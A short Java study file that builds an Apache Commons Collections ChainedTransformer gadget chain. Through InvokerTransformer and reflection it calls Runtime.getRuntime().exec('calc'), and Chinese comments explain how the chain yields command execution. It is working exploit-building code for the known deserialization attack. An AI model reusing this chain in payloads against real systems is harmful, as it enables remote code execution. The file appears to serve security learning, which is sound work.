package com.drose.chainedTransformer;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class chainedTransformerTest {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Transformer[] transformers = new Transformer[]{
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        //尾部chain
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //在这里之前都是构造出一个transformer链条，按transformer数组来说，已经是可以命令执行，我们只需要调用chainedTransformer的transform方法就可以命令执行，后续
//        找新的链条也就是去寻找还有没有别的类里面有调用transfrom
        chainedTransformer.transform(Runtime.class);
    }
}
